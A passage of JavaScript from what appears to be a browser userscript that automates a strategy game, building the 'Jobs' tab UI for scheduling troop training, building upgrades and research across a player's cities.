                if (!Seed.cities[b]) {
                    continue
                }
                if (!Data.options.training.city[b]) {
                    Data.options.training.city[b] = {}
                }
                if (!Data.options.training.city[b].units) {
                    Data.options.training.city[b].units = {};
                    for (i = 0; i < t.city[b].units_type.length; i++) {
                        var d = t.city[b].units_type[i];
                        Data.options.training.city[b].units[d] = 0
                    }
                }
                if (!Data.options.unit_cap.city[b]) {
                    Data.options.unit_cap.city[b] = {}
                }
                if (!Data.options.unit_cap.city[b].units) {
                    Data.options.unit_cap.city[b].units = {};
                    for (i = 0; i < t.units_type.length; i++) {
                        var d = t.city[b].units_type[i];
                        if (!Data.options.unit_cap.city[b]) {
                            Data.options.unit_cap.city[b] = {}
                        }
                        Data.options.unit_cap.city[b].units[d] = 0
                    }
                }
                if (!Data.options.building.level_cap[b]) {
                    Data.options.building.level_cap[b] = {}
                }
                if (!Data.options.building.level_enable[b]) {
                    Data.options.building.level_enable[b] = {}
                }
            }
            t.content_type = Data.options.jobs_tab;
            t.train_content_type = Data.options.train_tab;
            t.container = a;
            var e = '<ul class=tabs><li class="tab first"><a id=' + setUID("tabJobInfo") + ">" + translate("Summary") + "</a></li><li class=tab><a id=" + setUID("tabJobTrain") + ">" + translate("Train") + "</a></li><li class=tab><a id=" + setUID("tabJobBuild") + ">" + translate("Build") + "</a></li><li class=tab><a id=" + setUID("tabJobResearch") + ">" + translate("Research") + "</a></li></ul><div id=" + setUID("tabJob_Header") + "></div><div id=" + setUID("tabJob_Content") + "></div>";
            $J(t.container).html(e);
            $J("#" + UID.tabJob_Header).css({
                height: "225px",
                marginBottom: "2px"
            });
            $J("#" + UID.tabJob_Content).css({
                height: "450px",
                marginTop: "9px"
            }).addClass(UID.content);
            $J("#" + UID.tabJobInfo).click(t.tabJobInfo);
            $J("#" + UID.tabJobTrain).click(t.tabJobTrain);
            $J("#" + UID.tabJobBuild).click(t.tabJobBuild);
            $J("#" + UID.tabJobResearch).click(t.tabJobResearch);
            t.setTrainEnable(Data.options.training.enabled);
            t.setBuildEnable(Data.options.building.enabled);
            t.setResearchEnable(Data.options.research.enabled);
            window.addEventListener("unload", t.onUnload, false)
        },
        show: function () {
            var t = Tabs.Jobs;
            switch (t.content_type) {
            case 0:
                t.tabJobInfo();
                break;
            case 1:
                t.tabJobTrain();
                break;
            case 2:
                t.tabJobBuild();
                break;
            case 3:
                t.tabJobResearch();
                break
            }
        },
        hide: function () {
            var t = Tabs.Jobs
        },
        onUnload: function () {
            debugLog("Tabs.Jobs.onUnload");
            var t = Tabs.Jobs;
            Data.options.jobs_tab = t.content_type;
            Data.options.train_tab = t.train_content_type
        },
        clearTimers: function () {
            var t = Tabs.Jobs;
            clearTimeout(t.jobsStatTimer);
            clearTimeout(t.train_stat_timer);
            clearTimeout(t.build_stat_timer);
            clearTimeout(t.res_stat_timer)
        },
        tabJobInfo: function () {
            var t = Tabs.Jobs;
            $J("#" + UID[t.last_subtab]).removeClass("selected");
            $J("#" + UID[t.last_subtab]).css("z-index", "0");
            $J("#" + UID.tabJobInfo).addClass("selected");
            $J("#" + UID.tabJobInfo).css("z-index", "1");
            t.last_subtab = "tabJobInfo";
            t.content_type = 0;
            var g = Seed.cities[0];
            $J("#" + UID.tabJob_Header).css({
                height: "12pt",
                marginBottom: "2px"
            }).html("<div>" + translate("Info") + "</div>");
            $J("#" + UID.tabJob_Header + " > div").addClass(UID.title);
            $J("#" + UID.tabJob_Content).css({
                height: "670px",
                marginTop: "9px"
            }).html('<div><div id="' + setUID("tabJob_Container") + '"></div></div>');
            var h = $J("#" + UID.tabJob_Container);

            function jobsStatTick() {
                var a = "";
                for (var b = 0; b < Seed.cities.length; b++) {
                    if (!Seed.cities[b]) {
                        continue
                    }
                    a += cityTitle(b) + "<table class=" + UID.table + ">" + dispBuildingJob(b);
                    if (b === 0) {
                        a += dispResearchJob(0)
                    }
                    a += dispTrainingJobs(b) + "</table>"
                }
                h.html(a);
                h.css("height", h.outerHeight() + "px");
                h.parent().css("height", $J("#" + UID.tabJob_Content).innerHeight() - 10 + "px");
                h.parent().addClass(UID.scrollable)
            }
            function dispBuildingJob(a) {
                var b = "<tr><td class=right><b>" + translate("Building") + ":</b> </td>";
                var c = getBuildingJob(a);
                if (c && c.job.run_at > serverTime()) {
                    b += "<td>" + translate(c.building.type) + " (" + c.job.level + ") &nbsp;</td><td>&nbsp;<font color=" + bg + ">" + timeFormat(c.job.run_at - serverTime(), true) + "</font></td></tr>"
                } else {
                    b += "<td><span class=" + UID.bold_red + ">" + translate("Off") + "</span></td><td>&nbsp;</td></tr>"
                }
                return b
            }
            function dispResearchJob(a) {
                var b = "<tr><td class=right><b>" + translate("Researching") + ": </b></td>";
                var c = getResearchJob(a);
                if (c && c.run_at > serverTime()) {
                    b += "<td>" + translate(c.research_type) + " (" + c.level + ") &nbsp;</td><td>&nbsp;<font color=" + bg + ">" + timeFormat(c.run_at - serverTime(), true) + "</font></td></tr>"
                } else {
                    b += "<td><span class=" + UID.bold_red + ">" + translate("Off") + "</span></td><td>&nbsp;</td></tr>"
                }
                return b
            }
            function dispTrainingJobs(c) {
                var d = serverTime(),
                    trains = [];
                for (var i = 0; i < Seed.cities[c].jobs.length; i++) {
                    if (!Seed.cities[c]) {
                        continue
                    }
                    if (Seed.cities[c].jobs[i].queue === "units" && Seed.cities[c].jobs[i].unit_type && Seed.cities[c].jobs[i].run_at > d) {
                        trains.push(Seed.cities[c].jobs[i])
                    }
                }
                trains.sort(function (a, b) {
                    return a.run_at - b.run_at
                });
                var e = "<tr><td class=right><b>" + translate("Training") + ": </b></td>";
                if (trains.length) {
                    e += "<td>" + trains[0].quantity + "&nbsp;&nbsp;" + translate(trains[0].unit_type) + "&nbsp;</td><td>&nbsp;<font color=" + bg + ">" + timeFormat(trains[0].run_at - d, true) + "</font></td></tr>";
                    d = trains[0].run_at;
                    for (var i = 1; i < trains.length; i++) {
                        var f = "",
                            left_time = 0;
                        if (i === trains.length - 1) {
                            left_time = (trains[i].run_at - serverTime() > 0) ? trains[i].run_at - serverTime() : 0;
                            f = "&nbsp;<b>(" + timeFormatShort(left_time) + ")</b>"
                        }
                        left_time = (trains[i].run_at - d > 0) ? trains[i].run_at - d : 0;
                        e += "<tr><td>&nbsp;</td><td>" + trains[i].quantity + "&nbsp;&nbsp;" + translate(trains[i].unit_type) + "&nbsp;</td><td>&nbsp;<font color=" + bg + ">" + timeFormat(left_time, true) + f + "</font></td></tr>";
                        d = trains[i].run_at
                    }
                } else {
                    e += "<td><span class=" + UID.bold_red + ">" + translate("Off") + "</span></td><td>&nbsp;</td></tr>"
                }
                return e
            }
            function cityTitle(a) {
                var b = Seed.cities[a];
                var c = "";
                var d = (Seed.player.alliance ? Seed.player.alliance.name : "");
                if (a === 0) {
                    if (Seed.cities[a].defended) {
                        c = "<font class=" + UID.defending + ">" + translate("Defend").toUpperCase() + "</font>"
                    } else {
                        c = "<font class=" + UID.hiding + ">" + translate("Hiding").toUpperCase() + "</font>"
                    }
                } else {
                    c = "<font class=" + UID.defending + ">" + translate("Defend").toUpperCase() + "</font>"
                }
                var e = "<div class=" + UID.subtitle + "><table class=" + UID.table + "><tr><td align=left>" + translate(b.name) + "</td><td align=center width=200px><font color=yellow>" + (a === 0 ? d : "") + "</font></td><td align=right>" + c + "</td></tr></table></div>";
                return e
            }
            jobsStatTick();
            t.clearTimers();
            t.jobsStatTimer = setInterval(jobsStatTick, 1000)
        },
        tabJobTrain: function () {
            var t = Tabs.Jobs;
            $J("#" + UID[t.last_subtab]).removeClass("selected");
            $J("#" + UID[t.last_subtab]).css("z-index", "0");
            $J("#" + UID.tabJobTrain).addClass("selected");
            $J("#" + UID.tabJobTrain).css("z-index", "1");
            t.last_subtab = "tabJobTrain";
            t.content_type = 1;
            var a = "<div class=" + UID.title + ">" + translate("Training Progress") + "</div><div class=" + UID.status_ticker + ' style="margin-bottom: 5px !important"><center><input id=' + setUID("tabJobTrain_OnOff") + " type=button /></center><div id=" + setUID("tabJobTrain_Report") + " class=" + UID.status_report + "></div><br><div id=" + setUID("tabJobTrain_Feedback") + " class=" + UID.status_feedback + '></div></div><ul class=tabs><li class="tab first"><a id=' + setUID("tabJobTrain_tabTrain") + ">" + translate("Train") + '</a></li><li class="tab"><a id=' + setUID("tabJobTrain_tabConfig") + ">" + translate("Config") + "</a></li></ul>";
            $J("#" + UID.tabJob_Header).css({
                height: "225px",
                marginBottom: "2px"
            }).html(a);
            $J("#" + UID.tabJob_Content).css({
                height: "450px",
                marginTop: "17px"
            }).html("<div id=" + setUID("tabJobTrain_Content") + ">");
            $J("#" + UID.tabJobTrain_Content).css({
                height: ($J("#" + UID.tabJob_Content).innerHeight() - 10) + "px"
            }).addClass(UID.scrollable);
            $J("#" + UID.tabJobTrain_OnOff).click(function () {
                var t = Tabs.Jobs;
                t.setTrainEnable(!Data.options.training.enabled)
            });
            $J("#" + UID.tabJobTrain_tabTrain).click(t.tabJobTrainSets);
            $J("#" + UID.tabJobTrain_tabConfig).click(t.tabJobTrainConfig);
            t.refreshTrainButton(Data.options.training.enabled);
            switch (t.train_content_type) {
            case 0:
                t.tabJobTrainSets();
                break;
            case 1:
                t.tabJobTrainConfig();
                break
            }
            t.trainStatTick();
            t.clearTimers();
            t.train_stat_timer = setInterval(t.trainStatTick, 1000)
        },
        tabJobTrainSets: function () {
            var t = Tabs.Jobs;
            $J("#" + UID.tabJobTrain_tabConfig).removeClass("selected");
            $J("#" + UID.tabJobTrain_tabConfig).css("z-index", "0");
            $J("#" + UID.tabJobTrain_tabTrain).addClass("selected");
            $J("#" + UID.tabJobTrain_tabTrain).css("z-index", "1");
            t.train_content_type = 0;
            var f = [];
            var g = "<div id=" + setUID.tabJobTrainSets_Content + ">";
            for (var h = 0; h < Seed.cities.length; h++) {
                var j = Seed.cities[h];
                if (!j) {
                    continue
                }
                if (j.outpost_type == "SpectralDragonOutpost") {
                    continue
                }
                g += "<h4 ref=" + h + " class=" + UID.subtitle + ">" + translate(j.name) + "</h4><div><table class=" + UID.table + "><tr valign=top><td width=150><table class=" + UID.table + ">";
                g += "<tr><td></td><th>" + translate("Quantity") + "</th><th>" + translate("Total") + "</th></tr>";
                for (i = 0; i < t.city[h].units_type.length; i++) {
                    var k = t.city[h].units_type[i];
                    g += "<tr><td class=right>" + translate(k) + ":</td>";
                    var l = Data.options.training.city[h].units[k];
                    if (!l || isNaN(l)) {
                        l = 0
                    }
                    g += "<td align=middle><input type=text id=" + setUID("tabTrain_Unit_" + h + "_" + i) + " ref=" + h + "_" + i + ' maxlength=6 size=6 value="' + l + '" style="text-align:right;" /></td><td align=right>&nbsp;<span class=jewel>(' + getUnitNumbers(Seed.cities[0], k).total + ")</span></td></tr>";
                    f.push(UID["tabTrain_Unit_" + h + "_" + i])
                }
                g += "</table></td></tr></table></div>"
            }
            g += "</div>";
            $J("#" + UID.tabJobTrain_Content).html(g);
            $J("#" + UID.tabJobTrainSets_Content).css({
                overflow: "hidden"
            }).accordion({
                collapsible: true,
                active: t.train_accordion,
                changestart: function (a, b) {
                    var c = $J(b.newHeader[0]).attr("ref");
                    if (c) {
                        t.train_accordion = parseInt(c)
                    }
                }
            });

            function onChangeUnits(a) {
                var b = a.target.getAttribute("ref").split("_");
                var x = parseIntZero(a.target.value);
                var c = getMusterPointLevel(0);
                var d = c * 10000;
                d = (c === 11) ? 120000 : d;
                if (isNaN(x) || x < 0 || x > d) {
                    a.target.style.backgroundColor = "#faa";
                    dialogError(translate("Invalid number of troops", t.container))
                } else {
                    a.target.value = x;
                    var e = t.city[b[0]].units_type[b[1]];
                    Data.options.training.city[b[0]].units[e] = x;
                    a.target.style.backgroundColor = ""
                }
            }
            for (var i = 0; i < f.length; i++) {
                $J("#" + f[i]).change(onChangeUnits)
            }
        },
        tabJobTrainConfig: function () {
            var t = Tabs.Jobs;
            $J("#" + UID.tabJobTrain_tabTrain).removeClass("selected");
            $J("#" + UID.tabJobTrain_tabTrain).css("z-index", "0");
            $J("#" + UID.tabJobTrain_tabConfig).addClass("selected");
            $J("#" + UID.tabJobTrain_tabConfig).css("z-index", "1");
            t.train_content_type = 1;
            var c = "<div class=" + UID.subtitle + ">" + translate("Training Configuration") + "</div><div><table class=" + UID.table + "><tr><tdcolspan=2></td></tr>";
            setUID("tabTrainConfig_QRadio");
            c += "<tr><td><label><input type=radio name=" + UID.tabTrainConfig_QRadio + ' value="min_housing" />' + translate("Minimum Housing") + "</label></td></tr><tr><td><label><input type=radio name=" + UID.tabTrainConfig_QRadio + ' value="min_resource" />' + translate("Minimum Resource Levels") + "</label></td></tr></table></div>";
            var d = [];
            c += "<div class=" + UID.subtitle + ' style="background-color:#0044a0;">' + translate("Maximum Troops") + " (0 = no max)</div><table class=" + UID.table + "><tr valign=top><td width=150><table class=" + UID.table + ">";
            var i;
            for (i = 0; i < t.units_type.length; i++) {
                c += "<tr><td class=right>" + translate(t.units_type[i]) + ":</td>";
                var e = Data.options.unit_cap.city[0].units[i];
                if (!e || isNaN(e)) {
                    e = 0
                }
                c += "<td><input type=text id=" + setUID("tabTrainConfig_Cap_" + 0 + "_" + i) + " ref=" + (0 + "_" + i) + ' maxlength=6 size=6 value="' + e + '" style="text-align:right;" /></td></tr>';
                d.push(UID["tabTrainConfig_Cap_" + 0 + "_" + i])
            }
            c += "</table></td></tr></table></div>";
            $J("#" + UID.tabJobTrain_Content).html(c);
            var r = document.getElementsByName(UID.tabTrainConfig_QRadio);
            for (var i = 0; i < r.length; i++) {
                $J(r[i]).change(onChangeMode);
                r[i].checked = (r[i].value === Data.options.training.mode)
            }
            for (var i = 0; i < d.length; i++) {
                $J("#" + d[i]).change(onChangeUnits)
            }
            function onChangeMode(a) {
                var t = Tabs.Jobs;
                if (Data.options.training.enabled) {
                    t.setTrainEnable(false);
                    if (t.content_type === 1) {
                        t.dispFeedback(translate("Safe Mode") + " " + translate("Training") + " " + translate("Disabled"))
                    }
                }
                Data.options.training.mode = a.target.value
            }
            function onChangeUnits(a) {
                var b = a.target.getAttribute("ref").split("_");
                var x = parseIntZero(a.target.value);
                if (isNaN(x) || x < 0) {
                    a.target.style.backgroundColor = "#faa";
                    dialogError(translate("Invalid number of troops", t.container))
                } else {
                    a.target.value = x;
                    Data.options.unit_cap.city[b[0]].units[b[1]] = x;
                    a.target.style.backgroundColor = ""
                }
            }
        },
        tabJobBuild: function () {
            var t = Tabs.Jobs;
            $J("#" + UID[t.last_subtab]).removeClass("selected");
            $J("#" + UID[t.last_subtab]).css("z-index", "0");
            $J("#" + UID.tabJobBuild).addClass("selected");
            $J("#" + UID.tabJobBuild).css("z-index", "1");
            t.last_subtab = "tabJobBuild";
            t.content_type = 2;
            var f = "<div class=" + UID.title + ">" + translate("Construction Progress") + "</div><div class=" + UID.status_ticker + "><center><input id=" + setUID("tabJobBuild_OnOff") + " type=button /></center><div id=" + setUID("tabJobBuild_Report") + " class=" + UID.status_report + "></div><br><div id=" + setUID("tabJobBuild_Feedback") + " class=" + UID.status_feedback + "></div></div>";
            $J("#" + UID.tabJob_Header).css({
                height: "205px",
                marginBottom: "2px"
            }).html(f);
            $J("#" + UID.tabJob_Content).css({
                height: "475px",
                marginTop: "9px"
            }).html("<div id=" + setUID("tabJobBuild_Content") + ">");
            html = "";
            var g = [],
                list_city = [],
                list_field = [];
            for (var h = 0; h < Seed.cities.length; h++) {
                if (h === 0) {
                    list_city = t.research_capital;
                    list_field = t.research_field
                } else {
                    list_city = t.research_outpost;
                    list_field = t.research_field
                }
                var j = Seed.cities[h];
                if (!j) {
                    continue
                }
                var k = null;
                if (j.outpost_type == "SpectralDragonOutpost") {
                    list_city = t.research_outpost_spectral;
                    list_field = t.research_field_spectral;
                    k = h
                }
                html += "<h4 ref=" + h + " class=" + UID.subtitle + ">" + translate(j.name) + "</h4><div><table class=" + UID.table + ">";
                for (var i = 0; i < list_field.length; i++) {
                    html += "<tr><td><label><input type=checkbox id=" + setUID("tabJobBuild_CB_" + (h + "_" + list_field[i])) + " ref=" + (h + "_" + list_field[i]) + " " + (Data.options.building.level_enable[h][list_field[i]] ? "checked" : "") + " /> " + translate(list_field[i]) + "</label><td>&nbsp;<span class=jewel>" + Buildings.getLevel(h, list_field[i]) + "</span></td></td><td>" + buildDisplayCap(h, (list_city.length + i), list_field[i]) + "</td></tr>";
                    g.push(UID["tabJobBuild_CB_" + (h + "_" + list_field[i])])
                }
                html += "<tr><td colspan=5><hr></td></tr>";
                for (var i = 0; i < list_city.length; i++) {
                    html += "<tr><td><label><input type=checkbox id=" + setUID("tabJobBuild_CB_" + (h + "_" + list_city[i])) + " ref=" + (h + "_" + list_city[i]) + " " + (Data.options.building.level_enable[h][list_city[i]] ? "checked" : "") + " /> " + translate(list_city[i]) + "</label></td><td>&nbsp;<span class=jewel>" + Buildings.getLevel(h, list_city[i]) + "</span></td><td>" + buildDisplayCap(h, i, list_city[i]) + "</td></tr>";
                    g.push(UID["tabJobBuild_CB_" + (h + "_" + list_city[i])])
                }
                html += "</table></div>"
            }
            var l = $J("#" + UID.tabJobBuild_Content);
            l.css({
                height: ($J("#" + UID.tabJob_Content).innerHeight() - 10) + "px",
                overflow: "hidden"
            }).addClass(UID.scrollable).html(html).accordion({
                collapsible: true,
                active: t.build_accordion,
                changestart: function (a, b) {
                    var c = $J(b.newHeader[0]).attr("ref");
                    if (c) {
                        t.build_accordion = parseInt(c)
                    }
                }
            });
            for (var i = 0; i < g.length; i++) {
                $J("#" + g[i]).click(checkedBuild)
            }
            for (var h = 0; h < Seed.cities.length; h++) {
                if (!Seed.cities[h]) {
                    continue
                }
                var m = (h === 0) ? t.research_capital.concat(t.research_field) : ((h == k) ? t.research_outpost_spectral.concat(t.research_field_spectral) : t.research_outpost.concat(t.research_field));
                for (var i = 0; i < m.length; i++) {
                    var n = m[i];
                    var o = $id(UID["tabJobBuild_Cap_" + h + "_" + n]);
                    try {
                        if (!Data.options.building.level_cap[h][n]) {
                            var p = t.getCurrentLowestBuildingLevel(h, n);
                            o.selectedIndex = p;
                            Data.options.building.level_cap[h][n] = p
                        } else {
                            o.selectedIndex = Data.options.building.level_cap[h][n];
                            o.options[Data.options.building.level_cap[h][n]].selected = true;
                            t.checkBuildReqs(h, n)
                        }
                    } catch (e) {}
                    $J(o).attr("ref", JSON.stringify({
                        cid: h,
                        type: n
                    })).change(changeBuildCap)
                }
            }
            $J("#" + UID.tabJobBuild_OnOff).click(function () {
                var t = Tabs.Jobs;
                t.setBuildEnable(!Data.options.building.enabled)
            });
            t.refreshBuildButton(Data.options.building.enabled);

            function checkedBuild(a) {
                var b = a.target.getAttribute("ref");
                var c = b.split("_");
                var d = Seed.cities[c[0]].id;
                Data.options.building.level_enable[c[0]][c[1]] = a.target.checked;
                t.checkBuildReqs(c[0], c[1]);
                if (Data.options.building.enabled && a.target.checked) {
                    t.build_tick()
                }
            }
            function buildDisplayCap(a, b, c) {
                var d = Buildings.getLevel(a, c);
                var e = "<td><select id=" + setUID("tabJobBuild_Cap_" + a + "_" + c) + "><option value=0" + (d > 0 ? ' style="display:none;"' : "") + ">0</option><option value=1" + (d > 1 ? ' style="display:none;"' : "") + ">1</option><option value=2" + (d > 2 ? ' style="display:none;"' : "") + ">2</option><option value=3" + (d > 3 ? ' style="display:none;"' : "") + ">3</option><option value=4" + (d > 4 ? ' style="display:none;"' : "") + ">4</option><option value=5" + (d > 5 ? ' style="display:none;"' : "") + ">5</option><option value=6" + (d > 6 ? ' style="display:none;"' : "") + ">6</option><option value=7" + (d > 7 ? ' style="display:none;"' : "") + ">7</option><option value=8" + (d > 8 ? ' style="display:none;"' : "") + ">8</option><option value=9" + (d > 9 ? ' style="display:none;"' : "") + ">9</option><option value=10" + (d > 10 ? ' style="display:none;"' : "") + ">10</option><option value=11" + (d > 11 ? ' style="display:none;"' : "") + ">11</option></select></td><td id=" + setUID("tabJobBuild_FB_" + a + "_" + c) + ' class=jewel valign=top style="width:250px;white-space:normal;"></td>';
                return e
            }
            function changeBuildCap(a) {
                var b = JSON.parse($J(this).attr("ref"));
                Data.options.building.level_cap[b.cid][b.type] = a.target[a.target.selectedIndex].value;
                a.target.style.backgroundColor = "";
                t.checkBuildReqs(b.cid, b.type);
                if (Data.options.building.enabled) {
                    t.build_tick()
                }
            }
            t.buildStatTick();
            t.clearTimers();
            t.build_stat_timer = setInterval(t.buildStatTick, 1000)
        },
        tabJobResearch: function () {
            var t = Tabs.Jobs;
            $J("#" + UID[t.last_subtab]).removeClass("selected");
            $J("#" + UID[t.last_subtab]).css("z-index", "0");
            $J("#" + UID.tabJobResearch).addClass("selected");
            $J("#" + UID.tabJobResearch).css("z-index", "1");
            t.last_subtab = "tabJobResearch";
            t.content_type = 3;
            var b = "<div class=" + UID.title + ">" + translate("Research Progress") + "</div><div class=" + UID.status_ticker + "><center><input id=" + setUID("tabJobResearch_OnOff") + " type=button /></center><div id=" + setUID("tabJobResearch_Report") + " class=" + UID.status_report + "></div><br><div id=" + setUID("tabJobResearch_Feedback") + " class=" + UID.status_feedback + "></div></div>";
            $J("#" + UID.tabJob_Header).css({
                height: "205px",
                marginBottom: "2px"
            }).html(b);
            var c = "<div id=" + setUID("tabJobResearch_Config") + ">";
            var d = Seed.cities[0];
            c += "<div class=" + UID.subtitle + ">" + translate(d.name) + "</div><table class=" + UID.table + ">";
            var f = [];
            for (var i = 0; i < t.research_type.length; i++) {
                var g = t.research_type[i];
                var h = Seed.player.research[g] || 0;
                c += "<tr><td><label><input type=checkbox id=" + setUID("tabJobResearch_CB_" + g) + " " + (Data.options.research.level_enable[g] ? "checked" : "") + " ref=" + i + " /> " + translate(g) + "</label><td><span class=jewel>" + h + "</span></td></td><td><select id=" + setUID("tabJobResearch_Sel_" + g) + " ref=" + i + "><option value=0" + (h > 0 ? ' style="display:none;"' : "") + ">0</option><option value=1" + (h > 1 ? ' style="display:none;"' : "") + ">1</option><option value=2" + (h > 2 ? ' style="display:none;"' : "") + ">2</option><option value=3" + (h > 3 ? ' style="display:none;"' : "") + ">3</option><option value=4" + (h > 4 ? ' style="display:none;"' : "") + ">4</option><option value=5" + (h > 5 ? ' style="display:none;"' : "") + ">5</option><option value=6" + (h > 6 ? ' style="display:none;"' : "") + ">6</option><option value=7" + (h > 7 ? ' style="display:none;"' : "") + ">7</option><option value=8" + (h > 8 ? ' style="display:none;"' : "") + ">8</option><option value=9" + (h > 9 ? ' style="display:none;"' : "") + ">9</option><option value=10" + (h > 10 ? ' style="display:none;"' : "") + ">10</option><option value=11" + (h > 11 ? ' style="display:none;"' : "") + ">11</option></select></td><td id=" + setUID("tabJobResearch_FB_" + g) + ' class=jewel valign=top style="width:250px;white-space:normal;"></td></tr>';
                f.push(UID["tabJobResearch_CB_" + g])
            }
            c += "</table></div>";
            $J("#" + UID.tabJob_Content).css({
                height: "475px",
                marginTop: "9px"
            }).html(c);
            for (var i = 0; i < f.length; i++) {
                $J("#" + f[i]).click(checkedResearch)
            }
            for (var i = 0; i < t.research_type.length; i++) {
                var g = t.research_type[i];
                var j = $id(UID["tabJobResearch_Sel_" + g]);
                try {
                    if (!Data.options.research.level_cap[g]) {
                        var k = t.getCurrentResearchLevel(g);
                        j.selectedIndex = k;
                        Data.options.research.level_cap[g] = k
                    } else {
                        j.selectedIndex = Data.options.research.level_cap[g];
                        j.options[Data.options.research.level_cap[g]].selected = true;
                        t.checkResearchReqs(g)
                    }
                } catch (e) {}
                $J(j).change(changeResearchCap)
            }
            $J("#" + UID.tabJobResearch_OnOff).click(function () {
                var t = Tabs.Jobs;
                t.setResearchEnable(!Data.options.research.enabled)
            });
            t.refreshResearchButton(Data.options.research.enabled);

            function checkedResearch(a) {
                var t = Tabs.Jobs;
                var n = parseInt(a.target.getAttribute("ref"));
                Data.options.research.level_enable[t.research_type[n]] = a.target.checked;
                if (Data.options.research.level_enable[t.research_type[n]]) {
                    t.checkResearchReqs(t.research_type[n])
                }
                if (Data.options.research.enabled) {
                    t.researchTick()
                }
            }
            function changeResearchCap(a) {
                var t = Tabs.Jobs;
                var n = parseInt(a.target.getAttribute("ref"));
                Data.options.research.level_cap[t.research_type[n]] = a.target[a.target.selectedIndex].value;
                a.target.style.backgroundColor = "";
                if (Data.options.research.level_enable[t.research_type[n]]) {
                    t.checkResearchReqs(t.research_type[n])
                }
                if (Data.options.research.enabled) {
                    t.researchTick()
                }
            }
            t.researchStatTick();
            t.clearTimers();
            t.res_stat_timer = setInterval(t.researchStatTick, 1000)
        },
        setTrainEnable: function (a) {
            var t = Tabs.Jobs;
            t.refreshTrainButton(a);
            Data.options.training.enabled = a;
            clearTimeout(t.train_timer);
            if (a) {
                t.train_timer = setTimeout(t.trainTick, 3000, 0)
            } else {
                t.dispFeedback("")
            }
        },
        setBuildEnable: function (a) {
            var t = Tabs.Jobs;
            t.refreshBuildButton(a);
            Data.options.building.enabled = a;
            if (a) {
                t.build_retry_time = 20000;
                t.build_timer = setInterval(t.build_tick, 5000)
            } else {
                clearTimeout(t.build_timer)
            }
        },
        setResearchEnable: function (a) {
            var t = Tabs.Jobs;
            t.refreshResearchButton(a);
            Data.options.research.enabled = a;
            if (a) {
                t.res_retry_time = 20000;
                t.research_timer = setInterval(t.researchTick, 5000)
            } else {
                clearTimeout(t.research_timer)
            }
        },
        refreshTrainButton: function (a) {
            var t = Tabs.Jobs;
            var b = $id(UID.tabJobTrain_OnOff);
            if (!b) {
                return
            }
            if (a) {
                b.value = translate("Training").toUpperCase();
                b.className = UID.btn_on
            } else {
                b.value = translate("Disabled").toUpperCase();
                b.className = UID.btn_off
            }
        },
        refreshBuildButton: function (a) {
            var t = Tabs.Jobs;
            var b = $id(UID.tabJobBuild_OnOff);
            if (!b) {
                return
            }
            if (a) {
                b.value = translate("Building").toUpperCase();
                b.className = UID.btn_on
            } else {
                b.value = translate("Disabled").toUpperCase();
                b.className = UID.btn_off
            }
        },
        refreshResearchButton: function (a) {
            var t = Tabs.Jobs;
            var b = $id(UID.tabJobResearch_OnOff);
            if (!b) {
                return
            }
            if (a) {
                b.value = translate("Researching").toUpperCase();
                b.className = UID.btn_on
            } else {
                b.value = translate("Disabled").toUpperCase();
                b.className = UID.btn_off
            }
        },
        trainStatTick: function () {
            var t = Tabs.Jobs;
            var a = $id(UID.tabJobTrain_Report);
            if (a !== null) {
                a.innerHTML = trainTable("train")
            }
        },
        build_stat_fetch: false,
        buildStatTick: function () {
            var t = Tabs.Jobs;
            var a = "<table class=" + UID.table + ">";
            for (var c = 0; c < Seed.cities.length; c++) {
                var d = Seed.cities[c];
                if (!d) {
                    continue
                }
                var f = getBuildJob(c);
                var g = {
                    noPlayer: true,
                    cities: []
                };
                a += "<tr><td>" + translate(d.name) + ": </td><td>";
                if (f === null) {
                    a += translate("Off") + "</td></tr>"
                } else {
                    var b = Buildings.getById(c, f.city_building_id);
                    var h = ((f.run_at - serverTime()) > 0) ? timeFormat(f.run_at - serverTime()) : 0;
                    if (h === 0) {
                        a += translate("Awaiting task completion notification") + "...</td><td></td><td></td></tr>";
                        deleteBuildJob(c, f);
                        if (t.build_stat_fetch === false) {
                            if (c != 0) {
                                g.cities.push(Seed.cities[0].id)
                            }
                            g.cities.push(d.id);
                            Seed.fetchPlayer(g);
                            t.build_stat_fetch = true
                        }
                    } else {
                        a += translate(b.type) + "  (" + f.level + ") </td><td> <font color=" + bg + ">" + h + "</font></td></tr>";
                        t.build_stat_fetch = false;
                        try {
                            $id(UID["tabJobBuild_FB_" + c + "_" + b.type]).innerHTML = "<font color=#000>" + translate("Building") + ": " + translate(b.type) + " " + translate("Level").toLowerCase() + " " + f.level + "</font>"
                        } catch (e) {}
                    }
                }
            }
            a += "</table>";
            $J("#" + UID.tabJobBuild_Report).html(a)
        },
        research_stat_fetch: false,
        researchStatTick: function () {
            var t = Tabs.Jobs;
            var a = Seed.cities[0];
            var b = getResearchJob(0);
            var c = "<table class=" + UID.table + ">";
            c += "<tr><td>" + translate(a.name) + ": </td><td>";
            if (b === null) {
                c += translate("Off") + "</td></tr>"
            } else {
                var d = ((b.run_at - serverTime()) > 0) ? timeFormat(b.run_at - serverTime()) : 0;
                if (d === 0) {
                    c += translate("Awaiting task completion notification") + "...</td><td></td><td></td></tr>";
                    deleteResearchJob(b);
                    if (t.research_stat_fetch === false) {
                        Seed.fetchPlayer({
                            cities: [a.id]
                        });
                        t.research_stat_fetch = true
                    }
                } else {
                    c += translate(b.research_type) + " (" + b.level + ") </td><td>  <font color=" + bg + ">" + d + "</font></td></tr>";
                    t.research_stat_fetch = false
                }
            }
            c += "</table>";
            $J("#" + UID.tabJobResearch_Report).html(c);
            try {
                $J("#" + UID["tabJobResearch_FB_" + b.research_type]).html("<font color=#000>" + translate("Researching") + "&nbsp;" + translate("Level").toLowerCase() + "&nbsp;" + b.level + "</font>")
            } catch (e) {}
        },
        dispFeedback: function (a) {
            var t = Tabs.Jobs;
            var b = "";
            switch (t.content_type) {
            case 0:
                break;
            case 1:
                b = "tabJobTrain_Feedback";
                break;
            case 2:
                b = "tabJobBuild_Feedback";
                break;
            case 3:
                b = "tabJobResearch_Feedback";
                break
            }
            var c = $J("#" + UID[b]);
            if (c.length) {
                if (a === "") {
                    c.html(a)
                } else {
                    c.html(new Date().toTimeString().substring(0, 8) + "&nbsp;" + a)
                }
            }
        },
        getCurrentLowestBuildingLevel: function (a, c) {
            var t = Tabs.Jobs,
                level = 12;
            try {
                var b = Seed.cities[a].buildings;
                for (var i = 0; i < b.length; i++) {
                    if (b[i].type === c) {
                        if (b[i].level < level) {
                            level = b[i].level
                        }
                    }
                }
            } catch (e) {}
            return level
        },
        getLowestBuildingLevel: function (a, b) {
            var c = Seed.cities[a].buildings;
            var d = 12;
            var e = false;
